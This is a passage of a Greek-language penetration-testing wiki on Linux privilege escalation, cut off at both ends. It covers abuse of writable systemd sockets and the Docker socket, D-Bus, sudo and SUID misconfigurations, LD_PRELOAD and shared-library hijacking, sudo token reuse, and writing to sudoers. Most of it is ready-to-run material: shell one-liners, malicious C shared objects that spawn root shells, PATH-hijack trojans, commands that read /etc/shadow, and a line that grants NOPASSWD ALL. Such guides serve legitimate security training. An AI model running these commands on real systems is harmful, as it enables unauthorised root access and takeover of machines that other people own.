- `ListenStream`, `ListenDatagram`, `ListenSequentialPacket`, `ListenFIFO`, `ListenSpecial`, `ListenNetlink`, `ListenMessageQueue`, `ListenUSBFunction`: Αυτές οι επιλογές διαφέρουν αλλά σε περίληψη χρησιμοποιούνται για να **υποδείξουν πού θα ακούει** το socket (η διαδρομή του αρχείου AF_UNIX socket, η διεύθυνση IPv4/6 και/ή ο αριθμός θύρας για ακρόαση, κ.λπ.)
- `Accept`: Δέχεται boolean όρισμα. Εάν είναι **true**, δημιουργείται μια **service instance για κάθε εισερχόμενη σύνδεση** και μόνο το socket της σύνδεσης περνά σε αυτή. Εάν είναι **false**, όλα τα ακροατήρια sockets **περνάνε στη ξεκίνημένη service unit**, και δημιουργείται μόνο μία service unit για όλες τις συνδέσεις. Αυτή η τιμή αγνοείται για datagram sockets και FIFOs όπου μία μοναδική service unit χειρίζεται αναγκαστικά όλη την εισερχόμενη κίνηση. **Προεπιλογή false**. Για λόγους απόδοσης, συνιστάται να γράφονται νέοι daemons με τρόπο κατάλληλο για `Accept=no`.
- `ExecStartPre`, `ExecStartPost`: Δέχονται μία ή περισσότερες γραμμές εντολών, οι οποίες **εκτελούνται πριν** ή **μετά** τα ακροατήρια **sockets**/FIFOs **δημιουργηθούν** και δεθούν, αντιστοίχως. Το πρώτο token της γραμμής εντολής πρέπει να είναι ένα απόλυτο όνομα αρχείου, ακολουθούμενο από ορίσματα για τη διεργασία.
- `ExecStopPre`, `ExecStopPost`: Επιπλέον **εντολές** που **εκτελούνται πριν** ή **μετά** τα ακροατήρια **sockets**/FIFOs **κλείσουν** και αφαιρεθούν, αντιστοίχως.
- `Service`: Καθορίζει το όνομα της **service** unit που θα **ενεργοποιηθεί** σε **εισερχόμενη κίνηση**. Αυτή η ρύθμιση επιτρέπεται μόνο για sockets με Accept=no. Προεπιλογή είναι η service που έχει το ίδιο όνομα με το socket (με το κατάλληλο επίθημα). Στις περισσότερες περιπτώσεις δεν θα είναι απαραίτητη η χρήση αυτής της επιλογής.

### Εγγράψιμα .socket αρχεία

Αν βρείτε ένα **writable** `.socket` αρχείο μπορείτε να **προσθέσετε** στην αρχή της ενότητας `[Socket]` κάτι σαν: `ExecStartPre=/home/kali/sys/backdoor` και το backdoor θα εκτελεστεί πριν το socket δημιουργηθεί. Επομένως, **πιθανώς θα χρειαστεί να περιμένετε μέχρι το μηχάνημα να γίνει reboot.**\
_Σημειώστε ότι το σύστημα πρέπει να χρησιμοποιεί αυτή τη ρύθμιση του socket αρχείου αλλιώς το backdoor δεν θα εκτελεστεί_

### Εγγράψιμα sockets

Εάν **εντοπίσετε οποιοδήποτε writable socket** (_τώρα αναφερόμαστε σε Unix Sockets και όχι στα config `.socket` αρχεία_), τότε **μπορείτε να επικοινωνήσετε** με αυτό το socket και ίσως να εκμεταλλευτείτε κάποια ευπάθεια.

### Enumerate Unix Sockets
```bash
netstat -a -p --unix
```
### Ακατέργαστη σύνδεση
```bash
#apt-get install netcat-openbsd
nc -U /tmp/socket  #Connect to UNIX-domain stream socket
nc -uU /tmp/socket #Connect to UNIX-domain datagram socket

#apt-get install socat
socat - UNIX-CLIENT:/dev/socket #connect to UNIX-domain socket, irrespective of its type
```
**Exploitation example:**


{{#ref}}
socket-command-injection.md
{{#endref}}

### HTTP sockets

Σημειώστε ότι μπορεί να υπάρχουν κάποια **sockets listening for HTTP** requests (_δεν μιλάω για .socket αρχεία αλλά για τα αρχεία που λειτουργούν ως unix sockets_). Μπορείτε να το ελέγξετε με:
```bash
curl --max-time 2 --unix-socket /pat/to/socket/files http:/index
```
Εάν το socket **απαντά σε ένα HTTP** αίτημα, τότε μπορείτε να **επικοινωνήσετε** μαζί του και ίσως να **exploit** κάποια ευπάθεια.

### Εγγράψιμο Docker Socket

Το Docker socket, που συχνά βρίσκεται στο `/var/run/docker.sock`, είναι ένα κρίσιμο αρχείο που πρέπει να ασφαλιστεί. Από προεπιλογή, είναι εγγράψιμο από το χρήστη `root` και τα μέλη της ομάδας `docker`. Η κατοχή write access σε αυτό το socket μπορεί να οδηγήσει σε privilege escalation. Ακολουθεί μια ανάλυση για το πώς μπορεί να γίνει αυτό και εναλλακτικές μέθοδοι αν το Docker CLI δεν είναι διαθέσιμο.

#### **Privilege Escalation with Docker CLI**

Εάν έχετε write access στο Docker socket, μπορείτε να escalate privileges χρησιμοποιώντας τις παρακάτω εντολές:
```bash
docker -H unix:///var/run/docker.sock run -v /:/host -it ubuntu chroot /host /bin/bash
docker -H unix:///var/run/docker.sock run -it --privileged --pid=host debian nsenter -t 1 -m -u -n -i sh
```
Αυτές οι εντολές σας επιτρέπουν να τρέξετε ένα container με πρόσβαση επιπέδου root στο filesystem του host.

#### **Χρήση του Docker API απευθείας**

Σε περιπτώσεις όπου το Docker CLI δεν είναι διαθέσιμο, το Docker socket μπορεί να χειριστεί ακόμα μέσω του Docker API και εντολών `curl`.

1.  **List Docker Images:** Ανάκτηση της λίστας διαθέσιμων images.

```bash
curl -XGET --unix-socket /var/run/docker.sock http://localhost/images/json
```

2.  **Create a Container:** Αποστολή αιτήματος για δημιουργία container που κάνει mount το root directory του host.

```bash
curl -XPOST -H "Content-Type: application/json" --unix-socket /var/run/docker.sock -d '{"Image":"<ImageID>","Cmd":["/bin/sh"],"DetachKeys":"Ctrl-p,Ctrl-q","OpenStdin":true,"Mounts":[{"Type":"bind","Source":"/","Target":"/host_root"}]}' http://localhost/containers/create
```

Start the newly created container:

```bash
curl -XPOST --unix-socket /var/run/docker.sock http://localhost/containers/<NewContainerID>/start
```

3.  **Attach to the Container:** Χρησιμοποιήστε το `socat` για να δημιουργήσετε σύνδεση με το container, επιτρέποντας την εκτέλεση εντολών μέσα σε αυτό.

```bash
socat - UNIX-CONNECT:/var/run/docker.sock
POST /containers/<NewContainerID>/attach?stream=1&stdin=1&stdout=1&stderr=1 HTTP/1.1
Host:
Connection: Upgrade
Upgrade: tcp
```

Αφού δημιουργήσετε τη σύνδεση `socat`, μπορείτε να εκτελέσετε εντολές απευθείας στο container με πρόσβαση root στο filesystem του host.

### Άλλα

Σημειώστε ότι αν έχετε δικαιώματα εγγραφής στο docker socket επειδή είστε **μέλος της ομάδας `docker`** έχετε [**περισσότερους τρόπους για να αυξήσετε προνόμια**](interesting-groups-linux-pe/index.html#docker-group). Αν ο [**docker API ακούει σε μια θύρα** μπορείτε επίσης να τον παραβιάσετε](../../network-services-pentesting/2375-pentesting-docker.md#compromising).

Δείτε **περισσότερους τρόπους να διαφύγετε από docker ή να τον καταχραστείτε για άνοδο προνομίων** στο:


{{#ref}}
docker-security/
{{#endref}}

## Containerd (ctr) αύξηση προνομίων

Αν διαπιστώσετε ότι μπορείτε να χρησιμοποιήσετε την εντολή **`ctr`**, διαβάστε την παρακάτω σελίδα καθώς **μπορεί να μπορείτε να την καταχραστείτε για άνοδο προνομίων**:


{{#ref}}
containerd-ctr-privilege-escalation.md
{{#endref}}

## **RunC** αύξηση προνομίων

Αν διαπιστώσετε ότι μπορείτε να χρησιμοποιήσετε την εντολή **`runc`**, διαβάστε την παρακάτω σελίδα καθώς **μπορεί να μπορείτε να την καταχραστείτε για άνοδο προνομίων**:


{{#ref}}
runc-privilege-escalation.md
{{#endref}}

## **D-Bus**

D-Bus είναι ένα εξελιγμένο **inter-Process Communication (IPC) system** που επιτρέπει στις εφαρμογές να αλληλεπιδρούν και να μοιράζονται δεδομένα αποτελεσματικά. Σχεδιασμένο με το σύγχρονο σύστημα Linux στο μυαλό, προσφέρει ένα στιβαρό πλαίσιο για διάφορες μορφές επικοινωνίας μεταξύ εφαρμογών.

Το σύστημα είναι ευέλικτο, υποστηρίζοντας βασικό IPC που βελτιώνει την ανταλλαγή δεδομένων μεταξύ διεργασιών, θυμίζοντας **enhanced UNIX domain sockets**. Επιπλέον, βοηθά στη μετάδοση γεγονότων ή σημάτων, προάγοντας την απρόσκοπτη ενσωμάτωση μεταξύ των στοιχείων του συστήματος. Για παράδειγμα, ένα σήμα από ένα Bluetooth daemon για εισερχόμενη κλήση μπορεί να προκαλέσει ένα music player να σιγήσει, βελτιώνοντας την εμπειρία χρήστη. Επιπρόσθετα, το D-Bus υποστηρίζει ένα σύστημα remote objects, απλοποιώντας αιτήσεις υπηρεσιών και κλήσεις μεθόδων μεταξύ εφαρμογών, απλοποιώντας διεργασίες που παραδοσιακά ήταν πολύπλοκες.

Το D-Bus λειτουργεί με μοντέλο **allow/deny**, διαχειριζόμενο τα δικαιώματα μηνυμάτων (κλήσεις μεθόδων, εκπομπές σημάτων κ.λπ.) βάσει του αθροιστικού αποτελέσματος των κανόνων πολιτικής που ταιριάζουν. Αυτές οι πολιτικές καθορίζουν τις αλληλεπιδράσεις με το bus, και ενδέχεται να επιτρέψουν αύξηση προνομίων μέσω εκμετάλλευσης αυτών των δικαιωμάτων.

Παρατίθεται ένα παράδειγμα τέτοιας πολιτικής στο `/etc/dbus-1/system.d/wpa_supplicant.conf`, που περιγράφει τα δικαιώματα για τον χρήστη root να κατέχει, να στέλνει και να λαμβάνει μηνύματα από το `fi.w1.wpa_supplicant1`.

Οι πολιτικές χωρίς καθορισμένο χρήστη ή ομάδα εφαρμόζονται καθολικά, ενώ οι πολιτικές στο context "default" εφαρμόζονται σε όλους όσους δεν καλύπτονται από άλλες συγκεκριμένες πολιτικές.
```xml
<policy user="root">
<allow own="fi.w1.wpa_supplicant1"/>
<allow send_destination="fi.w1.wpa_supplicant1"/>
<allow send_interface="fi.w1.wpa_supplicant1"/>
<allow receive_sender="fi.w1.wpa_supplicant1" receive_type="signal"/>
</policy>
```
**Μάθετε πώς να enumerate και να exploit μια D-Bus communication εδώ:**


{{#ref}}
d-bus-enumeration-and-command-injection-privilege-escalation.md
{{#endref}}

## **Network**

Είναι πάντα ενδιαφέρον να enumerate το network και να προσδιορίσετε τη θέση του machine.

### Γενική enumeration
```bash
#Hostname, hosts and DNS
cat /etc/hostname /etc/hosts /etc/resolv.conf
dnsdomainname

#Content of /etc/inetd.conf & /etc/xinetd.conf
cat /etc/inetd.conf /etc/xinetd.conf

#Interfaces
cat /etc/networks
(ifconfig || ip a)

#Neighbours
(arp -e || arp -a)
(route || ip n)

#Iptables rules
(timeout 1 iptables -L 2>/dev/null; cat /etc/iptables/* | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null)

#Files used by network services
lsof -i
```
### Ανοιχτές θύρες

Πάντα ελέγχετε τις υπηρεσίες δικτύου που τρέχουν στη μηχανή και με τις οποίες δεν μπορέσατε να αλληλεπιδράσετε πριν αποκτήσετε πρόσβαση σε αυτήν:
```bash
(netstat -punta || ss --ntpu)
(netstat -punta || ss --ntpu) | grep "127.0"
```
### Sniffing

Ελέγξτε αν μπορείτε να sniff traffic. Αν μπορείτε, ίσως καταφέρετε να αποκτήσετε κάποια credentials.
```
timeout 1 tcpdump
```
## Users

### Generic Enumeration

Ελέγξτε ποιος είστε, ποιες **privileges** έχετε, ποιοι **users** υπάρχουν στο σύστημα, ποιοι μπορούν να **login** και ποιοι έχουν **root privileges**:
```bash
#Info about me
id || (whoami && groups) 2>/dev/null
#List all users
cat /etc/passwd | cut -d: -f1
#List users with console
cat /etc/passwd | grep "sh$"
#List superusers
awk -F: '($3 == "0") {print}' /etc/passwd
#Currently logged users
w
#Login history
last | tail
#Last log of each user
lastlog

#List all users and their groups
for i in $(cut -d":" -f1 /etc/passwd 2>/dev/null);do id $i;done 2>/dev/null | sort
#Current user PGP keys
gpg --list-keys 2>/dev/null
```
### Μεγάλο UID

Κάποιες εκδόσεις του Linux επηρεάστηκαν από ένα σφάλμα που επιτρέπει σε χρήστες με **UID > INT_MAX** να αποκτήσουν αυξημένα προνόμια. Περισσότερες πληροφορίες: [here](https://gitlab.freedesktop.org/polkit/polkit/issues/74), [here](https://github.com/mirchr/security-research/blob/master/vulnerabilities/CVE-2018-19788.sh) και [here](https://twitter.com/paragonsec/status/1071152249529884674).\
**Εκμεταλλευτείτε το** χρησιμοποιώντας: **`systemd-run -t /bin/bash`**

### Ομάδες

Ελέγξτε αν είστε **μέλος κάποιας ομάδας** που θα μπορούσε να σας δώσει δικαιώματα root:


{{#ref}}
interesting-groups-linux-pe/
{{#endref}}

### Πρόχειρο

Ελέγξτε εάν υπάρχει κάτι ενδιαφέρον στο πρόχειρο (αν είναι δυνατόν)
```bash
if [ `which xclip 2>/dev/null` ]; then
echo "Clipboard: "`xclip -o -selection clipboard 2>/dev/null`
echo "Highlighted text: "`xclip -o 2>/dev/null`
elif [ `which xsel 2>/dev/null` ]; then
echo "Clipboard: "`xsel -ob 2>/dev/null`
echo "Highlighted text: "`xsel -o 2>/dev/null`
else echo "Not found xsel and xclip"
fi
```
### Πολιτική Κωδικών Πρόσβασης
```bash
grep "^PASS_MAX_DAYS\|^PASS_MIN_DAYS\|^PASS_WARN_AGE\|^ENCRYPT_METHOD" /etc/login.defs
```
### Γνωστοί κωδικοί πρόσβασης

Αν **γνωρίζετε κάποιον κωδικό** του περιβάλλοντος, **προσπαθήστε να συνδεθείτε ως κάθε χρήστης** χρησιμοποιώντας αυτόν τον κωδικό.

### Su Brute

Αν δεν σας πειράζει να προκαλέσετε πολύ θόρυβο και τα δυαδικά `su` και `timeout` υπάρχουν στο σύστημα, μπορείτε να προσπαθήσετε να κάνετε brute-force έναν χρήστη χρησιμοποιώντας [su-bruteforce](https://github.com/carlospolop/su-bruteforce).\
[**Linpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) με την παράμετρο `-a` προσπαθεί επίσης να κάνει brute-force χρηστών.

## Καταχρήσεις εγγράψιμου PATH

### $PATH

Αν διαπιστώσετε ότι μπορείτε να **γράψετε μέσα σε κάποιον φάκελο του $PATH**, μπορεί να καταφέρετε να αυξήσετε προνόμια δημιουργώντας ένα backdoor μέσα στον εγγράψιμο φάκελο με το όνομα κάποιας εντολής που πρόκειται να εκτελεστεί από διαφορετικό χρήστη (ιδανικά root) και που **δεν φορτώνεται από φάκελο ο οποίος βρίσκεται πριν** από τον εγγράψιμο φάκελό σας στο $PATH.

### SUDO and SUID

Μπορεί να σας επιτρέπεται να εκτελέσετε κάποια εντολή χρησιμοποιώντας sudo ή να έχουν το suid bit. Ελέγξτε το χρησιμοποιώντας:
```bash
sudo -l #Check commands you can execute with sudo
find / -perm -4000 2>/dev/null #Find all SUID binaries
```
Κάποιες **απροσδόκητες εντολές σας επιτρέπουν να διαβάσετε και/ή να γράψετε αρχεία ή ακόμα και να εκτελέσετε μια εντολή.** Για παράδειγμα:
```bash
sudo awk 'BEGIN {system("/bin/sh")}'
sudo find /etc -exec sh -i \;
sudo tcpdump -n -i lo -G1 -w /dev/null -z ./runme.sh
sudo tar c a.tar -I ./runme.sh a
ftp>!/bin/sh
less>! <shell_comand>
```
### NOPASSWD

Η διαμόρφωση του Sudo μπορεί να επιτρέψει σε έναν χρήστη να εκτελέσει κάποια εντολή με τα προνόμια άλλου χρήστη χωρίς να γνωρίζει τον κωδικό πρόσβασης.
```
$ sudo -l
User demo may run the following commands on crashlab:
(root) NOPASSWD: /usr/bin/vim
```
Σε αυτό το παράδειγμα ο χρήστης `demo` μπορεί να τρέξει το `vim` ως `root`. Τώρα είναι απλό να αποκτήσετε ένα shell προσθέτοντας ένα ssh key στον root directory ή καλώντας `sh`.
```
sudo vim -c '!sh'
```
### SETENV

Αυτή η οδηγία επιτρέπει στον χρήστη να **set an environment variable** κατά την εκτέλεση μιας εντολής:
```bash
$ sudo -l
User waldo may run the following commands on admirer:
(ALL) SETENV: /opt/scripts/admin_tasks.sh
```
Αυτό το παράδειγμα, **βασισμένο στην HTB machine Admirer**, ήταν **vulnerable** σε **PYTHONPATH hijacking** που επέτρεπε τη φόρτωση μιας αυθαίρετης python library ενώ το script εκτελούταν ως root:
```bash
sudo PYTHONPATH=/dev/shm/ /opt/scripts/admin_tasks.sh
```
### BASH_ENV διατηρείται μέσω sudo env_keep → root shell

Αν το sudoers διατηρεί το `BASH_ENV` (π.χ. `Defaults env_keep+="ENV BASH_ENV"`), μπορείτε να εκμεταλλευτείτε τη μη-διαδραστική συμπεριφορά εκκίνησης του Bash για να εκτελέσετε αυθαίρετο κώδικα ως root όταν καλείτε μια επιτρεπόμενη εντολή.

- Γιατί λειτουργεί: Σε μη-διαδραστικά shells, το Bash αξιολογεί το `$BASH_ENV` και κάνει source εκείνου του αρχείου πριν τρέξει το στοχευμένο script. Πολλοί κανόνες sudo επιτρέπουν την εκτέλεση ενός script ή ενός shell wrapper. Εάν το `BASH_ENV` διατηρείται από το sudo, το αρχείο σας θα γίνει source με δικαιώματα root.

- Απαιτήσεις:
- Ένας κανόνας sudo που μπορείτε να εκτελέσετε (οποιοδήποτε target που καλεί `/bin/bash` μη-διαδραστικά, ή οποιοδήποτε bash script).
- Το `BASH_ENV` παρόν στο `env_keep` (ελέγξτε με `sudo -l`).

- PoC:
```bash
cat > /dev/shm/shell.sh <<'EOF'
#!/bin/bash
/bin/bash
EOF
chmod +x /dev/shm/shell.sh
BASH_ENV=/dev/shm/shell.sh sudo /usr/bin/systeminfo   # or any permitted script/binary that triggers bash
# You should now have a root shell
```
- Σκληροποίηση:
- Αφαίρεση `BASH_ENV` (και `ENV`) από `env_keep`, προτιμήστε `env_reset`.
- Αποφύγετε shell wrappers για εντολές που επιτρέπονται από sudo· χρησιμοποιήστε ελάχιστα εκτελέσιμα.
- Εξετάστε καταγραφή I/O του sudo και ειδοποίηση όταν χρησιμοποιούνται διατηρούμενες env vars.

### Sudo env_keep+=PATH / insecure secure_path → PATH hijack

If `sudo -l` shows `env_keep+=PATH` or a `secure_path` containing attacker-writable entries (e.g., `/home/<user>/bin`), any relative command inside the sudo-allowed target can be shadowed.

- Requirements: a sudo rule (often `NOPASSWD`) running a script/binary that calls commands without absolute paths (`free`, `df`, `ps`, etc.) and a writable PATH entry that is searched first.
```bash
cat > ~/bin/free <<'EOF'
#!/bin/bash
chmod +s /bin/bash
EOF
chmod +x ~/bin/free
sudo /usr/local/bin/system_status.sh   # calls free → runs our trojan
bash -p                                # root shell via SUID bit
```
### Παράκαμψη μονοπατιών εκτέλεσης με Sudo
**Μετάβαση** για να διαβάσετε άλλα αρχεία ή να χρησιμοποιήσετε **symlinks**. Για παράδειγμα στο sudoers file: _hacker10 ALL= (root) /bin/less /var/log/\*_
```bash
sudo less /var/logs/anything
less>:e /etc/shadow #Jump to read other files using privileged less
```

```bash
ln /etc/shadow /var/log/new
sudo less /var/log/new #Use symlinks to read any file
```
Εάν χρησιμοποιηθεί **wildcard** (\*), είναι ακόμα πιο εύκολο:
```bash
sudo less /var/log/../../etc/shadow #Read shadow
sudo less /var/log/something /etc/shadow #Red 2 files
```
**Μέτρα αντιμετώπισης**: [https://blog.compass-security.com/2012/10/dangerous-sudoers-entries-part-5-recapitulation/](https://blog.compass-security.com/2012/10/dangerous-sudoers-entries-part-5-recapitulation/)

### Sudo command/SUID binary χωρίς καθορισμένη διαδρομή εντολής

Αν η **sudo permission** δοθεί για μία μόνο εντολή **χωρίς να καθοριστεί το path**: _hacker10 ALL= (root) less_ μπορείς να το εκμεταλλευτείς αλλάζοντας τη μεταβλητή PATH
```bash
export PATH=/tmp:$PATH
#Put your backdoor in /tmp and name it "less"
sudo less
```
Αυτή η τεχνική μπορεί επίσης να χρησιμοποιηθεί αν ένα **suid** binary **εκτελεί άλλη εντολή χωρίς να καθορίζει το path προς αυτήν (πάντα έλεγξε με** _**strings**_ **το περιεχόμενο ενός περίεργου SUID binary)**).

[Payload examples to execute.](payloads-to-execute.md)

### SUID binary με command path

Αν το **suid** binary **εκτελεί άλλη εντολή καθορίζοντας το path**, τότε μπορείς να προσπαθήσεις να **export a function** με το όνομα της εντολής που καλεί το suid αρχείο.

Για παράδειγμα, αν ένα suid binary καλεί _**/usr/sbin/service apache2 start**_ πρέπει να προσπαθήσεις να δημιουργήσεις τη function και να την export-άρεις:
```bash
function /usr/sbin/service() { cp /bin/bash /tmp && chmod +s /tmp/bash && /tmp/bash -p; }
export -f /usr/sbin/service
```
Στη συνέχεια, όταν καλέσετε το suid binary, αυτή η συνάρτηση θα εκτελεστεί

### LD_PRELOAD & **LD_LIBRARY_PATH**

Η μεταβλητή περιβάλλοντος **LD_PRELOAD** χρησιμοποιείται για να καθορίσει μία ή περισσότερες shared libraries (.so files) που θα φορτωθούν από τον loader πριν από όλες τις υπόλοιπες, συμπεριλαμβανομένης της standard C library (`libc.so`). Αυτή η διαδικασία είναι γνωστή ως preloading μιας βιβλιοθήκης.

Ωστόσο, για να διατηρηθεί η ασφάλεια του συστήματος και να αποτραπεί η εκμετάλλευση αυτής της δυνατότητας, ειδικά σε **suid/sgid** executables, το σύστημα επιβάλλει ορισμένες προϋποθέσεις:

- Ο loader αγνοεί **LD_PRELOAD** για executables όπου το πραγματικό user ID (_ruid_) δεν ταιριάζει με το effective user ID (_euid_).
- Για executables με suid/sgid, μόνο οι βιβλιοθήκες σε standard paths που είναι επίσης suid/sgid προφορτώνονται.

Privilege escalation μπορεί να συμβεί εάν έχετε τη δυνατότητα να εκτελείτε εντολές με `sudo` και η έξοδος του `sudo -l` περιλαμβάνει τη δήλωση **env_keep+=LD_PRELOAD**. Αυτή η ρύθμιση επιτρέπει στη μεταβλητή περιβάλλοντος **LD_PRELOAD** να παραμένει και να αναγνωρίζεται ακόμη και όταν οι εντολές τρέχουν με `sudo`, ενδεχομένως οδηγώντας στην εκτέλεση αυθαίρετου κώδικα με αυξημένα προνόμια.
```
Defaults        env_keep += LD_PRELOAD
```
Αποθηκεύστε ως **/tmp/pe.c**
```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
unsetenv("LD_PRELOAD");
setgid(0);
setuid(0);
system("/bin/bash");
}
```
Στη συνέχεια **μεταγλωττίστε το** χρησιμοποιώντας:
```bash
cd /tmp
gcc -fPIC -shared -o pe.so pe.c -nostartfiles
```
Τέλος, **escalate privileges** κατά την εκτέλεση
```bash
sudo LD_PRELOAD=./pe.so <COMMAND> #Use any command you can run with sudo
```
> [!CAUTION]
> Ένα παρόμοιο privesc μπορεί να αξιοποιηθεί αν ο επιτιθέμενος ελέγχει την env μεταβλητή **LD_LIBRARY_PATH**, επειδή έτσι ελέγχει τη διαδρομή όπου θα αναζητηθούν οι βιβλιοθήκες.
```c
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
unsetenv("LD_LIBRARY_PATH");
setresuid(0,0,0);
system("/bin/bash -p");
}
```

```bash
# Compile & execute
cd /tmp
gcc -o /tmp/libcrypt.so.1 -shared -fPIC /home/user/tools/sudo/library_path.c
sudo LD_LIBRARY_PATH=/tmp <COMMAND>
```
### SUID Binary – .so injection

Όταν συναντάτε ένα binary με δικαιώματα **SUID** που φαίνεται ασυνήθιστο, είναι καλή πρακτική να ελέγξετε αν φορτώνει σωστά αρχεία **.so**. Αυτό μπορεί να ελεγχθεί εκτελώντας την ακόλουθη εντολή:
```bash
strace <SUID-BINARY> 2>&1 | grep -i -E "open|access|no such file"
```
Για παράδειγμα, η εμφάνιση ενός σφάλματος όπως _"open(“/path/to/.config/libcalc.so”, O_RDONLY) = -1 ENOENT (No such file or directory)"_ υποδηλώνει πιθανότητα εκμετάλλευσης.

Για να το εκμεταλλευτείτε, θα προχωρούσατε δημιουργώντας ένα αρχείο C, π.χ. _"/path/to/.config/libcalc.c"_, που περιέχει τον ακόλουθο κώδικα:
```c
#include <stdio.h>
#include <stdlib.h>

static void inject() __attribute__((constructor));

void inject(){
system("cp /bin/bash /tmp/bash && chmod +s /tmp/bash && /tmp/bash -p");
}
```
Αυτός ο κώδικας, μόλις μεταγλωττιστεί και εκτελεστεί, στοχεύει στην ανύψωση προνομίων με τη χειραγώγηση των δικαιωμάτων αρχείων και την εκτέλεση ενός shell με αυξημένα προνόμια.

Μεταγλωττίστε το παραπάνω αρχείο C σε ένα shared object (.so) αρχείο με:
```bash
gcc -shared -o /path/to/.config/libcalc.so -fPIC /path/to/.config/libcalc.c
```
Τέλος, η εκτέλεση του επηρεασμένου SUID binary θα πρέπει να ενεργοποιήσει το exploit, επιτρέποντας πιθανή παραβίαση του συστήματος.

## Shared Object Hijacking
```bash
# Lets find a SUID using a non-standard library
ldd some_suid
something.so => /lib/x86_64-linux-gnu/something.so

# The SUID also loads libraries from a custom location where we can write
readelf -d payroll  | grep PATH
0x000000000000001d (RUNPATH)            Library runpath: [/development]
```
Τώρα που έχουμε βρει ένα SUID binary που φορτώνει μια library από έναν φάκελο όπου μπορούμε να γράψουμε, ας δημιουργήσουμε τη library σε αυτόν τον φάκελο με το απαραίτητο όνομα:
```c
//gcc src.c -fPIC -shared -o /development/libshared.so
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
setresuid(0,0,0);
system("/bin/bash -p");
}
```
Εάν λάβετε ένα σφάλμα όπως
```shell-session
./suid_bin: symbol lookup error: ./suid_bin: undefined symbol: a_function_name
```
that means that the library you have generated need to have a function called `a_function_name`.

### GTFOBins

[**GTFOBins**](https://gtfobins.github.io) είναι μια επιμελημένη λίστα με Unix binaries που μπορούν να εκμεταλλευτούν επιτιθέμενοι για να παρακάμψουν τοπικούς περιορισμούς ασφάλειας. [**GTFOArgs**](https://gtfoargs.github.io/) είναι το ίδιο αλλά για περιπτώσεις όπου μπορείτε **μόνο να εισάγετε arguments** σε μια εντολή.

Το project συγκεντρώνει νόμιμες λειτουργίες των Unix binaries που μπορούν να καταχραστούν για να ξεφύγουν από restricted shells, να αυξήσουν ή να διατηρήσουν αυξημένα privileges, να μεταφέρουν αρχεία, να δημιουργήσουν bind και reverse shells, και να διευκολύνουν άλλες post-exploitation εργασίες.

> gdb -nx -ex '!sh' -ex quit\
> sudo mysql -e '! /bin/sh'\
> strace -o /dev/null /bin/sh\
> sudo awk 'BEGIN {system("/bin/sh")}'


{{#ref}}
https://gtfobins.github.io/
{{#endref}}


{{#ref}}
https://gtfoargs.github.io/
{{#endref}}

### FallOfSudo

If you can access `sudo -l` you can use the tool [**FallOfSudo**](https://github.com/CyberOne-Security/FallofSudo) to check if it finds how to exploit any sudo rule.

### Reusing Sudo Tokens

Σε περιπτώσεις όπου έχετε **sudo access** αλλά όχι το password, μπορείτε να αυξήσετε privileges περιμένοντας την εκτέλεση μιας εντολής sudo και στη συνέχεια καταλαμβάνοντας το session token.

Requirements to escalate privileges:

- Έχετε ήδη ένα shell ως χρήστης "_sampleuser_"
- "_sampleuser_" έχει **χρησιμοποιήσει `sudo`** για να εκτελέσει κάτι στα **τελευταία 15mins** (εξ ορισμού αυτή είναι η διάρκεια του sudo token που μας επιτρέπει να χρησιμοποιήσουμε `sudo` χωρίς να εισάγουμε κάποιο password)
- `cat /proc/sys/kernel/yama/ptrace_scope` είναι 0
- `gdb` είναι προσβάσιμο (μπορείτε να το ανεβάσετε)

(Μπορείτε προσωρινά να ενεργοποιήσετε `ptrace_scope` με `echo 0 | sudo tee /proc/sys/kernel/yama/ptrace_scope` ή μόνιμα τροποποιώντας `/etc/sysctl.d/10-ptrace.conf` και ορίζοντας `kernel.yama.ptrace_scope = 0`)

If all these requirements are met, **you can escalate privileges using:** [**https://github.com/nongiach/sudo_inject**](https://github.com/nongiach/sudo_inject)

- Το **πρώτο exploit** (`exploit.sh`) θα δημιουργήσει το binary `activate_sudo_token` στο _/tmp_. Μπορείτε να το χρησιμοποιήσετε για να **ενεργοποιήσετε το sudo token στη συνεδρία σας** (δεν θα πάρετε αυτόματα ένα root shell, κάντε `sudo su`):
```bash
bash exploit.sh
/tmp/activate_sudo_token
sudo su
```
- Το **δεύτερο exploit** (`exploit_v2.sh`) θα δημιουργήσει ένα sh shell στο _/tmp_ που ανήκει στον root με setuid
```bash
bash exploit_v2.sh
/tmp/sh -p
```
- Το **third exploit** (`exploit_v3.sh`) θα **δημιουργήσει ένα sudoers file** που κάνει τα **sudo tokens** αιώνια και **επιτρέπει σε όλους τους χρήστες να χρησιμοποιούν sudo**
```bash
bash exploit_v3.sh
sudo su
```
### /var/run/sudo/ts/\<Username>

Εάν έχετε **δικαιώματα εγγραφής (write permissions)** στον φάκελο ή σε οποιοδήποτε από τα αρχεία που έχουν δημιουργηθεί μέσα σε αυτόν, μπορείτε να χρησιμοποιήσετε το binary [**write_sudo_token**](https://github.com/nongiach/sudo_inject/tree/master/extra_tools) για να **δημιουργήσετε ένα sudo token για έναν χρήστη και PID**.\\
Για παράδειγμα, αν μπορείτε να αντικαταστήσετε (overwrite) το αρχείο _/var/run/sudo/ts/sampleuser_ και τρέχετε ένα shell με αυτόν τον χρήστη (PID 1234), μπορείτε να **αποκτήσετε sudo privileges** χωρίς να χρειάζεται να γνωρίζετε τον κωδικό, κάνοντας:
```bash
./write_sudo_token 1234 > /var/run/sudo/ts/sampleuser
```
### /etc/sudoers, /etc/sudoers.d

Το αρχείο `/etc/sudoers` και τα αρχεία μέσα στο `/etc/sudoers.d` καθορίζουν ποιος μπορεί να χρησιμοποιήσει `sudo` και πώς. Αυτά τα αρχεία **εξ ορισμού μπορούν να διαβαστούν μόνο από τον χρήστη root και την ομάδα root**.\
**Αν** μπορείτε να **διαβάσετε** αυτό το αρχείο, μπορεί να καταφέρετε να **αποκτήσετε κάποιες ενδιαφέρουσες πληροφορίες**, και αν μπορείτε να **γράψετε** οποιοδήποτε αρχείο, θα μπορέσετε να **αυξήσετε τα δικαιώματα**.
```bash
ls -l /etc/sudoers /etc/sudoers.d/
ls -ld /etc/sudoers.d/
```
Αν μπορείς να γράψεις, μπορείς να εκμεταλλευτείς αυτήν την άδεια.
```bash
echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers
